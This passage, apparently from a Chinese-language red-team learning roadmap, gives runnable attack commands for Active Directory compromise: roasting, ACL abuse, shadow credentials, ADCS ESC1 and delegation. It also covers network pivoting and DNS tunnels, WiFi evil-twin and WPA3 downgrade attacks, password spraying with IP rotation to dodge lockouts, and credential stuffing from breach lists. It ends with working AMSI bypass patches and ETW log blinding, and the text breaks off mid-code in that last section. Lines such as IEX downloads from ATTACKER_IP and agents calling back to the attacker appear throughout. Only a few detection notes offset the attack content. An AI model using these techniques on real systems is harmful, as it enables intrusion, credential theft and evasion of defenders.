### 6.6.5 AS-REP Roasting

**如果你知道有效用户名，这完全不需要任何凭据就能奏效。**

```bash
# 无凭据（需要用户列表）：
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip DC_IP -format hashcat

# 有凭据（自动发现账户）：
impacket-GetNPUsers domain.local/user:Password123 -dc-ip DC_IP -request

# 从 Windows：Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep_hashes.txt

# 破解：
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

**检测痕迹：**
- 事件 ID 4768（Kerberos 认证服务请求），预认证类型 = 0

---

### 6.6.6 Kerberoasting

**需要任意有效域凭据：哪怕是一个低权限用户。**

```bash
# 从 Linux：
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP -request -output kerberoast_hashes.txt

# 从 Windows：Rubeus
.\Rubeus.exe kerberoast /format:hashcat /outfile:C:\Temp\kerberoast_hashes.txt
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat

# 破解：
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# OneRuleToRuleThemAll：https://github.com/NotSoSecure/password_cracking_rules
```

---

### 6.6.7 LAPS 枚举

LAPS（本地管理员密码解决方案）把每台机器唯一的随机本地管理员密码存储在 Active Directory 中。如果你能读取 `ms-McsAdmPwd` 属性，就能以明文拿到那台机器的本地管理员密码。

```bash
# 从 Linux：pyLAPS
# https://github.com/p0dalirius/pyLAPS
python3 pyLAPS.py -d domain.local -u user -p Password123 -dc-ip DC_IP --action get
# 显示：计算机名称及其当前 LAPS 密码

# 从 Linux：nxc
nxc ldap DC_IP -u user -p Password123 --laps

# 从 Windows（PowerShell）：
Get-ADComputer COMPUTER_NAME -Properties ms-McsAdmPwd | Select-Object Name, ms-McsAdmPwd

# BloodHound CE：内置查询
# “Find All Computers with LAPS” -> “Find LAPS Readable Computers by User”
# 如果你当前用户可以读取 LAPS，BloodHound 会显示出来

# 用 LAPS 密码进行横向移动：
nxc smb TARGET_IP -u administrator -p "LAPS_PASSWORD_HERE" --local-auth
impacket-psexec administrator:LAPS_PASSWORD@TARGET_IP
```

**检测痕迹：**
- 对 ms-McsAdmPwd 的 LDAP 查询：DC 上的事件 ID 1644（如果启用了 LDAP 诊断）
- 读取 LAPS 属性：如果配置了，会出现在 AD 对象访问审核日志中

---

### 6.6.8 ACL 滥用

Active Directory 对象权限经常被配置错误。BloodHound 会自动识别这些，但你需要知道如何滥用每一种权限类型。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/7._ACL_Abuse.png" alt="ACL Abuse" width="550"/>

</td></tr></table>
</div>

```bash
# 用 BloodHound 查找 ACL 配置错误：
# “Find Principals with DCSync Rights”
# “Find Shortest Paths to Domain Admins”（包含 ACL 边）
# 要寻找的边类型：GenericAll、GenericWrite、WriteOwner、WriteDACL、
#   ForceChangePassword、AddMember、Owns

# 用 PowerView 滥用（从内存加载：见第 10 节）：
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
# PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# 对用户的 GenericAll：重置其密码
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# 对组的 GenericAll：把自己加入该组
Add-DomainGroupMember -Identity "Domain Admins" -Members "your_username"

# 对用户的 GenericWrite：设置 SPN 并对其实施 Kerberoast（定向 Kerberoasting）
Set-DomainObject -Identity target_user -Set @{serviceprincipalname="fake/spn"}
.\Rubeus.exe kerberoast /user:target_user /format:hashcat

# 对域对象的 WriteDACL：给自己授予 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity your_username \
  -Rights DCSync

# ForceChangePassword（强制改密）
$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $pass

# WriteOwner：先取得所有权
Set-DomainObjectOwner -Identity target_user -OwnerIdentity your_username
# 然后给自己授予 GenericAll：
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity your_username -Rights All
```

**检测痕迹：**
- ACL 修改：事件 ID 5136（目录服务对象已修改）
- 组成员变更：事件 ID 4728（成员被加入启用安全性的全局组）
- 密码重置：事件 ID 4723（密码更改尝试）和 4724（密码重置）

---

### 6.6.9 影子凭据

影子凭据滥用 AD 对象上的 `msDS-KeyCredentialLink` 属性。如果你能写入用户或计算机账户上的这个属性，就可以添加自己的公钥，然后用 PKINIT Kerberos 以该账户身份认证并取得其 NT 哈希。无需修改密码。

```bash
# 前提条件：
# - 对目标的 msDS-KeyCredentialLink 属性有写权限
#   （GenericAll、GenericWrite，或对该属性的显式 WriteProperty）
# - Windows Server 2016+ 域控（支持 PKINIT）
# - 已启用 ADCS 或 Windows Hello for Business（部分场景无需也可）

# 工具：certipy（也处理 ADCS 攻击：见 6.6.10）
pip3 install certipy-ad

# 检查目标是否存在漏洞（需要对 msDS-KeyCredentialLink 有写权限）：
certipy shadow auto -u user@domain.local -p Password123 -account target_user -dc-ip DC_IP
# 这会自动：
# 1. 向 target_user 的 msDS-KeyCredentialLink 添加新的密钥凭据
# 2. 用该密钥以 target_user 身份认证
# 3. 通过 PKINIT 获取 target_user 的 NT 哈希
# 4. 移除该密钥凭据（清理）

# 输出：target_user 的 NT 哈希 -> 用于 PtH

# 手动步骤（如果你想理解 certipy 在做什么）：
# 第 1 步：添加密钥凭据
certipy shadow add -u user@domain.local -p Password123 -account target_user -dc-ip DC_IP
# 第 2 步：认证并获取哈希
certipy auth -pfx target_user.pfx -domain domain.local -username target_user -dc-ip DC_IP
# 第 3 步：清理
certipy shadow remove -u user@domain.local -p Password123 -account target_user -dc-ip DC_IP

# 从 Windows：Whisker
# https://github.com/eladshamir/Whisker
.\Whisker.exe add /target:target_user /domain:domain.local /dc:DC_IP
.\Rubeus.exe asktgt /user:target_user /certificate:CERT_BASE64 /password:"CERT_PASSWORD" /getcredentials
```

**检测痕迹：**
- 修改 msDS-KeyCredentialLink：事件 ID 5136（目录服务对象已修改）
- PKINIT 认证：事件 ID 4768，Certificate Issuer 字段已设置

---

### 6.6.10 ADCS 利用 - ESC1

Active Directory 证书服务（ADCS）是现代企业网络中最关键的攻击面之一。ESC1 是最常见的配置错误：证书模板允许注册者指定主题备用名称（SAN），同时具备客户端认证用途。这让你可以为任意用户（包括域管理员）申请证书，并用它来认证。

```bash
# 工具：certipy
pip3 install certipy-ad

# 第 1 步：查找有漏洞的证书模板
certipy find -u user@domain.local -p Password123 -dc-ip DC_IP -vulnerable -stdout
# 在输出中寻找：“ESC1”
# ESC1 的条件：
#   - 注册权限：Domain Users（或你的账户）
#   - 客户端认证：True
#   - 注册者提供主题：True（关键的配置错误）

# 第 2 步：以域管理员身份申请证书
certipy req -u user@domain.local -p Password123 -dc-ip DC_IP \
  -ca "DOMAIN-CA" -template VulnerableTemplate -upn administrator@domain.local
# -ca：来自 certipy find 输出的 CA 名称
# -template：来自 certipy find 的有漏洞模板名称
# -upn：你想冒充的用户（域管理员 UPN）
# 输出：administrator.pfx（证书和私钥）

# 第 3 步：用该证书以域管理员身份认证
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip DC_IP
# 输出：Administrator 的 NT 哈希和一个 Kerberos TGT

# 第 4 步：使用哈希或票据
impacket-secretsdump -hashes :NTLM_HASH administrator@DC_IP -just-dc
# 或者：
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass administrator@DC_IP -just-dc

# 其他 ESC 变体：
# ESC4：模板 ACL 有漏洞（你对模板本身有写权限）
certipy template -u user@domain.local -p Password123 -template VulnTemplate \
  -save-old -dc-ip DC_IP
# 然后按 ESC1 利用

# ESC6：CA 带有 EDITF_ATTRIBUTESUBJECTALTNAME2 标志（任何模板都变成 ESC1）
# ESC8：向 AD CS 的 HTTP 端点做 NTLM 中继
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController
```

**ADCS 为什么重要：** 2026 年，超过 90% 的企业环境运行 ADCS。仅 ESC1 就存在于很大一部分默认安装中。一旦你拥有域管理员的证书，它在模板有效期内（通常是 1-2 年）始终有效，即使账户密码已更改。它是现有最强大的持久化机制之一。

**检测痕迹：**
- 带异常 UPN 的证书请求：CA 上的事件 ID 4886（证书服务收到证书请求）
- Certipy 认证：事件 ID 4768，带异常的 Certificate Issuer

---

### 6.6.11 约束委派滥用

委派允许服务账户在访问其他服务时代表用户行事。配置错误的委派是通往域管理员的直接路径。

```bash
# 委派类型：
# 非约束：可冒充任意用户访问任意服务（阶段 3 的领域）
# 约束：可冒充任意用户访问特定服务
# 基于资源的约束委派（RBCD）：由资源方控制，而非请求方

# 查找具有约束委派的账户：
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo

# 用 Rubeus 滥用约束委派（S4U2Proxy）：
# 你需要该账户的 NT 哈希或票据
.\Rubeus.exe s4u /user:svc_account /rc4:NT_HASH /impersonateuser:administrator \
  /msdsspn:cifs/targetserver.domain.local /ptt
# /msdsspn：该账户被信任可委派到的服务
# /ptt：直接注入票据

# RBCD 攻击：
# 如果你对 msDS-AllowedToActOnBehalfOfOtherIdentity 属性有写权限
# 在计算机账户上，你可以从攻击者控制的机器配置 RBCD。
# 然后用 S4U 冒充任意用户访问该计算机。

# 第 1 步：创建新的机器账户（如果 MachineAccountQuota 允许）
impacket-addcomputer domain.local/user:Password123 -computer-name ATTACKER$ \
  -computer-pass AttackerPass123! -dc-ip DC_IP

# 第 2 步：在目标计算机上设置 RBCD
Get-ADComputer TARGET_COMPUTER | Set-ADComputer -PrincipalsAllowedToDelegateToAccount ATTACKER$

# 第 3 步：获取目标上 administrator 的服务票据
.\Rubeus.exe s4u /user:ATTACKER$ /rc4:NT_HASH_OF_ATTACKER$ /impersonateuser:administrator \
  /msdsspn:cifs/TARGET_COMPUTER.domain.local /ptt
# 你现在拥有目标计算机上 administrator 的票据
```

---

---

## 第 7 节：网络跳板与隧道

### 这是什么，为什么重要

你的初始访问把你落在某个网段的一台机器上。高价值目标（域控制器、数据库服务器、内部应用）位于你无法直接到达的网段。跳板利用你已攻陷的机器作为中继，去访问那些内部网段。

### 跳板架构

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/8._Pivoting_Architecture.png" alt="Pivoting Architecture" width="1100"/>

</td></tr></table>
</div>

---

### 7.1 Ligolo-ng - TUN 接口跳板（推荐）

Ligolo-ng 会在你的攻击机上创建一个真实的网络接口，并通过隧道路由流量。nmap、impacket、evil-winrm 等工具可以原生工作：无需 proxychains。

```bash
# 下载：https://github.com/nicocha30/ligolo-ng
# 两个都要下载：proxy（在攻击机运行）+ agent（投放到目标）

# 攻击机：启动代理服务器：
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# 目标：投放并连接 agent：
./agent -connect ATTACKER_IP:11601 -ignore-cert    # Linux
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert  # Windows

# 攻击机：在 ligolo-ng 控制台中：
ligolo-ng >> session           # 列出已连接的 agent
ligolo-ng >> 1                 # 选择 agent 1
ligolo-ng >> ifconfig          # 查看目标的网络接口：记下内部网段
ligolo-ng >> start             # 开始建立隧道

# 攻击机：添加通往内部网络的路由：
sudo ip route add 10.10.10.0/24 dev ligolo
# 现在直接扫描内部网络：无需 proxychains：
nmap -sV 10.10.10.0/24
impacket-secretsdump domain/user:pass@10.10.10.5
evil-winrm -i 10.10.10.10 -u administrator -p 'Password123!'

# 双重跳板：到达第三个网段：
# 在第一台跳板机（10.10.10.x）上运行第二个 agent
# 在 ligolo 中：选择第二个 agent -> start
sudo ip route add 172.16.0.0/24 dev ligolo
```

---

### 7.2 Chisel - HTTP/S 隧道

```bash
# https://github.com/jpillora/chisel
# 下载攻击机（Linux）和目标（Windows/Linux）的二进制文件

# 攻击机：启动服务器：
./chisel server --port 8080 --reverse --socks5

# 目标：连接并创建反向 SOCKS5 隧道：
.\chisel.exe client ATTACKER_IP:8080 R:socks
# 在攻击机的 127.0.0.1:1080 上创建 SOCKS5 代理

# 配置 proxychains（/etc/proxychains4.conf）：
# socks5 127.0.0.1 1080

# 让工具走 SOCKS 代理：
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 impacket-psexec domain/user:pass@10.10.10.5

# 用 TLS 混入 HTTPS 流量：
# 攻击机：
./chisel server --port 443 --reverse --socks5 \
  --tls-cert /path/to/cert.pem --tls-key /path/to/key.pem
# 目标：
.\chisel.exe client --tls-skip-verify https://ATTACKER:443 R:socks

# 转发特定端口：
.\chisel.exe client ATTACKER:8080 R:3389:10.10.10.5:3389
# 现在：RDP 到 127.0.0.1:3389 -> 隧道到 10.10.10.5:3389
```

---

### 7.3 SSH 隧道

```bash
# 动态端口转发（基于 SSH 的 SOCKS 代理）：
ssh -D 1080 -N -f user@PIVOT_HOST
proxychains4 nmap -sT 10.10.10.0/24

# 本地端口转发（到达某个特定内部服务）：
ssh -L 3389:INTERNAL_HOST:3389 user@PIVOT_HOST -N -f
# RDP 到 127.0.0.1:3389 -> 走隧道

# 远程端口转发（在跳板机上暴露你的攻击机端口）：
ssh -R 4444:127.0.0.1:4444 user@PIVOT_HOST -N -f

# 多跳：
ssh -J user@JUMP1,user@JUMP2 user@FINAL_TARGET

# 用于整洁多跳的 SSH 配置（~/.ssh/config）：
Host final
    HostName 10.10.10.20
    User admin
    ProxyJump user@jump1.example.com,user@jump2.example.com
```

---

### 7.4 Windows 上的端口转发 - 无需二进制

```powershell
# netsh portproxy：Windows 内置

# 将本地 8080 端口转发到内部 10.10.10.5:445：
netsh interface portproxy add v4tov4 `
  listenport=8080 listenaddress=0.0.0.0 `
  connectport=445 connectaddress=10.10.10.5

# 列出所有规则：
netsh interface portproxy show all

# 删除规则（清理）：
netsh interface portproxy delete v4tov4 listenport=8080

# 在 Windows 防火墙中放行：
netsh advfirewall firewall add rule name="pivot" `
  protocol=TCP dir=in localport=8080 action=allow
```

---

### 7.5 DNS 隧道 - 最后手段

```bash
# 适用场景：目标网络只允许 DNS 出站（出站 53 端口）
# 数据速率：约 3KB/s（很慢），但用于 C2 信标很可靠
# 需要：你控制的域名，且有一条指向攻击机的名称服务器记录

# iodine：通过 DNS 隧道传输 IP
# 服务端（必须可作为 tunnel.yourdomain.com 的名称服务器被访问到）：
sudo iodined -f -c -P secretpassword 10.99.0.1 tunnel.yourdomain.com

# 客户端（在目标上）：
iodine -f -P secretpassword DNS_SERVER_IP tunnel.yourdomain.com

# dnscat2：更简单、面向 C2 的 DNS 隧道
# 服务端（攻击机）：
ruby dnscat2.rb tunnel.yourdomain.com
# 客户端（Windows）：
.\dnscat2.exe tunnel.yourdomain.com
```

---

---

## 第 8 节：无线攻击

### 这是什么，为什么重要

无线攻击针对的是物理上靠近目标 WiFi 的场景。如果企业 WiFi 密码是 `Company2026!`，再坚固的外围防线也毫无用处。

**硬件要求：** 一块支持监听模式和注入数据包的 WiFi 网卡。笔记本内置网卡几乎从不支持。

**推荐网卡（2026-2027）：**
- Alfa AWUS036ACH：802.11ac，Kali 支持广泛，双频
- Alfa AWUS036ACHM：MU-MIMO，覆盖更好
- 检查支持情况：`iw list | grep -A 10 "Supported interface modes"`（必须显示 `monitor`）

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html) | 文档 | 3 小时 | 免费 | 完整阅读官方套件文档。 |
| [hcxtools Documentation](https://github.com/ZerBea/hcxtools) | 文档 | 2 小时 | 免费 | 现代的 WPA 捕获与转换工具链。 |
| [WPA3 Dragonblood Paper](https://papers.mathyvanhoef.com/dragonblood.pdf) | 论文 | 2 小时 | 免费 | 理解 WPA3 的攻击面。 |

---

### 8.1 环境搭建 - 监听模式

```bash
# 结束会干扰的进程：
airmon-ng check kill

# 启用监听模式：
airmon-ng start wlan0
# 接口会变成：wlan0mon

# 替代方法（在某些网卡上更可靠）：
ip link set wlan0 down
iw wlan0 set monitor none
ip link set wlan0 up

# 验证：
iwconfig wlan0mon    # 应显示：Mode:Monitor
```

---

### 8.2 WPA2-Personal - 握手捕获与破解

```bash
# 扫描网络：
airodump-ng wlan0mon
# 关键列：BSSID（AP MAC）、CH（信道）、ENC（加密方式）、ESSID（SSID 名称）

# 针对特定网络：
airodump-ng --bssid TARGET_BSSID --channel TARGET_CH \
  --write handshake_capture wlan0mon

# 对客户端进行去认证，迫使其重连：
aireplay-ng --deauth 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
# 捕获到时 airodump-ng 会显示：[ WPA handshake: TARGET_BSSID ]

# CPU 破解：
aircrack-ng handshake_capture-01.cap -w /usr/share/wordlists/rockyou.txt

# GPU 破解（快得多）：
hcxpcapngtool -o capture.hc22000 handshake_capture-01.cap
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000：WPA-PBKDF2-PMKID+EAPOL（统一的 WPA/WPA2 模式）

# 添加规则：
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

---

### 8.3 PMKID 攻击 - 无需客户端

```bash
# hcxdumptool 直接从 AP 捕获 PMKID：
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 --filterlist_ap=target_bssid.txt
# 运行 2-5 分钟

# 转换：
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# 破解：
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

> **为什么 PMKID 更好：** 不需要去认证数据包。不需要等待客户端。完全被动。大多数企业 WiFi AP 即使没有客户端连接也存在漏洞。

---

### 8.4 邪恶双胞胎 - WPA2-Enterprise（企业网络）

```bash
# Hostapd-WPE：针对 WPA2-EAP（MSCHAPv2）的流氓 AP
apt install hostapd-wpe

cat > /etc/hostapd-wpe/hostapd-wpe.conf << 'EOF'
interface=wlan0mon
ssid=CorporateWiFi
channel=6
auth_server_shared_secret=RADIUS_SECRET
ieee8021x=1
eap_server=1
EOF

sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# 捕获到的凭据显示如下：
# 用户名：jsmith@domain.com
# NT：a3b4c5d6e7f8...（NTLMv2 哈希）

# 破解 NTLMv2：
hashcat -m 5600 captured_ntlm.txt /usr/share/wordlists/rockyou.txt

# eaphammer（自动化完整的邪恶双胞胎流程）：
# https://github.com/s0lst1c3/eaphammer
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid CorporateWiFi \
  --creds --negotiate balanced
```

---

### 8.5 WPA3 过渡模式攻击

**为什么过渡模式才是真正的攻击面：** 纯 WPA3 网络（仅 SAE、强制 PMF）的抗攻击能力显著更强。但在 2026-2027 年，出于设备兼容性原因，绝大多数企业 WiFi 网络仍处于 WPA3 过渡模式。

```bash
# 第 1 步：判断目标 AP 是否处于过渡模式
airodump-ng wlan0mon
# 寻找：ENC 列中的 WPA2+SAE 或“WPA3 Transition”

# 第 2 步：用相同的 SSID 创建仅 WPA2 的流氓 AP
cat > /tmp/wpa2_only.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=TargetWiFi          # WPA3 网络的确切 SSID
hw_mode=g
channel=6
wpa=2
wpa_passphrase=doesntmatter
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/wpa2_only.conf &

# 第 3 步：从真实 AP 对 WPA3 客户端去认证
aireplay-ng --deauth 10 -a REAL_AP_BSSID -c CLIENT_MAC wlan0mon
# 客户端漫游 -> 连到 WPA2 流氓 AP（如果它容易中招）-> 捕获握手

# 第 4 步：捕获并破解 WPA2 握手
airodump-ng --bssid YOUR_ROGUE_AP_MAC --channel 6 --write wpa3_downgrade wlan0mon
hcxpcapngtool -o downgrade.hc22000 wpa3_downgrade-01.cap
hashcat -m 22000 downgrade.hc22000 /usr/share/wordlists/rockyou.txt

# Dragonblood 侧信道攻击（直接攻击 WPA3-SAE，需要 AP 固件存在漏洞）
# 研究论文：https://papers.mathyvanhoef.com/dragonblood.pdf
# 工具：https://github.com/vanhoefm/dragonslayer
python3 dragonslayer.py --interface wlan0mon --target-bssid TARGET_BSSID
```

---

---

## 第 9 节：密码攻击方法论

### 9.1 密码喷洒

**关键：喷洒之前先读密码策略。**

```bash
# 先读策略：
net accounts /domain              # 在域内的一台 Windows 机器上
enum4linux-ng -A DC_IP            # 从 Linux
# 字段：锁定阈值（按阈值 - 1 喷洒）、观察窗口

# 用 kerbrute 进行域喷洒（基于 Kerberos，噪音更低）：
# https://github.com/ropnop/kerbrute
./kerbrute userenum -d domain.local --dc DC_IP users.txt    # 先枚举有效用户
./kerbrute passwordspray -d domain.local --dc DC_IP users.txt "Password2027!"

# 用 nxc 进行域喷洒：
nxc smb DC_IP -u users.txt -p passwords.txt --no-bruteforce
nxc smb DC_IP -u users.txt -p "Summer2027!" --continue-on-success

# 用 CredMaster + FireProx 对 M365/Azure AD 喷洒（IP 轮换）：
# 每个请求来自不同的 AWS IP：绕过按 IP 的锁定
# https://github.com/knavesec/CredMaster
python3 credmaster.py --plugin msol \
  --access_key AWS_KEY --secret_access_key AWS_SECRET \
  -u domain_users.txt -p passwords.txt -t 5

# 用 theHarvester 构建用户列表：
awk -F@ '{print $1}' harvested_emails.txt > domain_users.txt

# 企业密码模式（2026-2027 年收益最高）：
# CompanyName2027!    CompanyName2026!
# Spring2027!   Summer2027!   Winter2026!   Fall2026!
# January2027!  September2027!
# Welcome1   Welcome@1   P@ssword1   Password123!
# ACME2027!   acme@123

# 从公司网站构建自定义字典：
cewl https://www.target.com -d 3 -w custom_words.txt
cewl https://www.target.com/about -d 2 >> custom_words.txt
sort -u custom_words.txt -o custom_words.txt
```

---

### 9.2 Hashcat - GPU 密码破解

```bash
# 哈希识别：
hashid hash.txt
# 或者：https://hashes.com/en/tools/hash_identifier

# 常见哈希模式：
# NTLM:            hashcat -m 1000
# NTLMv2:          hashcat -m 5600
# Kerberos TGS:    hashcat -m 13100
# Kerberos AS-REP: hashcat -m 18200
# SHA-256:         hashcat -m 1400
# bcrypt:          hashcat -m 3200
# WPA/WPA2:        hashcat -m 22000

# 基础字典攻击：
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# 字典 + 规则：
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# OneRuleToRuleThemAll（社区最有效的单条规则）：
# https://github.com/NotSoSecure/password_cracking_rules
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# 掩码攻击（模式生成）：
# ?u=大写  ?l=小写  ?d=数字  ?s=特殊字符  ?a=全部
# 企业常见模式：大写 + 5 个小写 + 4 个数字 + 特殊字符
hashcat -m 1000 ntlm_hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d?s

# GPU 速度参考（RTX 4090，2026 年基准）：
# NTLM:    ~164 GH/s (8-char full keyspace: under 1 second)
# NTLMv2:  ~4.5 GH/s
# MD5:     ~164 GH/s
# SHA-256: ~20 GH/s
# bcrypt:  ~184 kH/s (wordlist + rules only viable strategy)

# 显示已破解结果：
hashcat -m 1000 ntlm_hashes.txt --show
```

---

### 9.3 撞库

```bash
# 泄露数据来源（2026-2027）：
# HIBP API：https://haveibeenpwned.com/API/v3
# IntelX：https://intelx.io（付费，语料量大）
# DeHashed：https://dehashed.com（付费）

# 筛选出目标域名的泄露数据：
grep -i "@target.com" breach_combo_list.txt > target_creds.txt

# 提取用户名和密码：
awk -F: '{print $1}' target_creds.txt > target_users.txt
awk -F: '{print $NF}' target_creds.txt > target_passwords.txt

# 用 CredMaster 喷洒：
python3 credmaster.py --plugin msol \
  --access_key AWS_KEY --secret_access_key AWS_SECRET \
  -u target_users.txt -p target_passwords.txt -t 5 --timeout 30
```

---

---

## 第 10 节：AV/EDR 规避与载荷投递

### 这是什么，为什么重要

本节正是原始阶段 2 路线图所缺失的部分。没有它，第 3、4、6 节中的每一项技术在真实系统上尝试的那一刻就会失败。2026 年默认设置下的 Windows Defender，会在 WinPEAS、Rubeus、SharpHound、Mimikatz 以及大多数编译后的 Metasploit 载荷接触磁盘的几秒内检测到它们。

理解 AV 和 EDR 规避不是可选项。它是实验室操作者与实战操作者之间的差别。

### EDR 检测如何工作

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/9._How_EDR_Detection_Works.png" alt="How EDR Detection Works" width="1000"/>

</td></tr></table>
</div>

**这对你意味着什么：**
- 把已知恶意文件写入磁盘：立即检测（哈希/YARA）
- 运行 PowerShell 脚本：AMSI 在执行前扫描它
- 注入 shellcode：EDR 钩子会捕获 API 调用
- 使用 LOLBins：EDR 关注它们做了什么，而不只是运行了

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [Sektor7 Malware Dev Essentials](https://institute.sektor7.net/red-team-operator-malware-development-essentials) | 课程 | 10 小时 | $30 | 面向初学者最好的实战 AV 规避课程。 |
| [VX-Underground](https://www.vx-underground.org/) | 参考 | 持续更新 | 免费 | 恶意软件样本和论文。研究真实恶意软件如何规避检测。 |
| [AMSI Bypass Catalogue](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) | 参考 | 3 小时 | 免费 | 可用 AMSI 绕过的完整清单。 |
| [Process Injection Techniques](https://github.com/3xpl01tc0d3r/ProcessInjection) | 参考 | 4 小时 | 免费 | Windows 进程注入方法概览。 |
| [Havoc Evasion Techniques](https://havocframework.com/docs/) | 文档 | 3 小时 | 免费 | 现代 C2 框架如何处理规避。 |

---

### 10.1 AMSI 绕过 - 关闭 PowerShell 的扫描器

AMSI（反恶意软件扫描接口）会拦截 PowerShell、JScript 和 VBScript 的执行，并在运行前把内容交给已安装的 AV 检查。加载任何攻击性 PowerShell 工具（PowerView、Invoke-Mimikatz、PowerSharpPack 等）之前，必须先禁用 AMSI。

```powershell
# AMSI 如何工作：
# PowerShell 在执行任何脚本块之前调用 AmsiScanBuffer()
# AmsiScanBuffer() 位于 amsi.dll 中，该 DLL 被加载进 PowerShell 进程
# 你在内存中给 AmsiScanBuffer() 打补丁，使其始终返回 AMSI_RESULT_CLEAN (1)
# 于是 PowerShell“认为”所有脚本都是干净的

# AMSI 绕过方法 1：给 AmsiScanBuffer 打补丁（适用于 Windows 10/11、PowerShell 5/7）
# 这在内存中给该函数打补丁，使其立即返回成功
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$Lib = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($Lib, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
# 运行之后：PowerShell 不再扫描任何东西。可以随意加载你的工具。

# AMSI 绕过方法 2：带字符串混淆的 PowerShell 版本
# （避免绕过代码本身被检测）
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# AMSI 绕过方法 3：基于反射（避免静态特征检测）
[ReflEction.AssEmbly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
# 注意：这针对的是 ETW 日志，而非直接针对 AMSI

# 验证绕过是否生效：
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 然后测试：IEX("EICAR_TEST_STRING") 不应被拦截
```

---

### 10.2 ETW 补丁 - 让日志失明

ETW（Windows 事件跟踪）支撑着 PowerShell ScriptBlock 日志记录（事件 ID 4104）。即使绕过了 AMSI，ScriptBlock 日志仍会记录每条 PowerShell 命令。给 ETW 打补丁让它停下来。

```powershell
# 在当前 PowerShell 进程中给 ETW 打补丁：
$patched = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOw=='))
$R = [Reflection.Assembly]::LoadWithPartialName("System.Core")
$G = $R.GetType('System.Diagnostics.Eventing.EventProvider')
$F = $G.GetField('m_enabled', 'NonPublic,Instance')
